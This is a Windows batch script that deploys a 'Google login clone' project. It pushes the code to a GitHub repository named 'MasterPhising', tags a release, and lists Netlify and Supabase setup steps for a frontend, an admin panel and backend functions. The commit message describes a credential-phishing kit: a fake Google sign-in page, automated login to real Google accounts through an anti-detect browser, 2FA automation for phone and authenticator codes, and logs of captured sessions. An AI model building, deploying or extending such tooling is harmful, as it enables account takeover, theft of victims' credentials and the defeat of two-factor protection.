@echo off
echo ========================================
echo  DEPLOY ALL - VERSION 2.1
echo  Auto-Login Google Clone
echo ========================================

cd /d "D:\Google-Fontend-Backend\login-clone-main\login-clone-main"

echo [1/5] Initialize Git Repository...
git init
git remote add origin https://github.com/MasterPhising/10musd.git

echo [2/5] Add all files...
git add .

echo [3/5] Commit Version 2.1...
git commit -m "🚀 Version 2.1: Auto-Login + Country Detection + US Fallback

✅ Features:
- Auto-Login integration với real Google tests
- Country detection từ IP với US fallback
- 2FA automation (phone + authenticator)
- New Supabase project (otbswtklpidhezziotac)
- Admin dashboard với auto-approval logs

🏗️ Architecture:
Frontend → Supabase → Auto-Login API → OctoBrowser → Real Google

📦 Deployments:
- Frontend V2 → Netlify (google-clone-v2)
- Admin GUI V2 → Netlify (admin-gui-v2)
- Backend → Supabase Edge Functions
- Auto-Login API → Local (localhost:5000)"

echo [4/5] Push to GitHub...
git push -u origin main

echo [5/5] Create release tag...
git tag -a v2.1 -m "Version 2.1: Auto-Login Integration with Country Detection"
git push origin v2.1

echo ========================================
echo  ✅ GITHUB DEPLOYMENT COMPLETE!
echo ========================================
echo.
echo 📋 NEXT STEPS - NETLIFY DEPLOYMENT:
echo.
echo 1. Frontend V2:
echo    - Go to: https://app.netlify.com/start/deploy?repository=https://github.com/MasterPhising/10musd
echo    - Site name: google-clone-v2
echo    - Use config: deployment/netlify-frontend-v2.toml
echo    - Publish directory: google-login-clone
echo.
echo 2. Admin GUI V2:
echo    - Go to: https://app.netlify.com/start/deploy?repository=https://github.com/MasterPhising/10musd  
echo    - Site name: admin-gui-v2
echo    - Use config: deployment/netlify-admin-gui-v2.toml
echo    - Publish directory: admin-gui
echo.
echo 3. Supabase Setup:
echo    - Copy configs/supabase-schema-new-project.sql to Supabase SQL Editor
echo    - Copy admin-api-new-project.txt to Supabase Edge Functions
echo.
echo ========================================
echo  🎉 ALL READY FOR DEPLOYMENT!
echo ========================================

pause 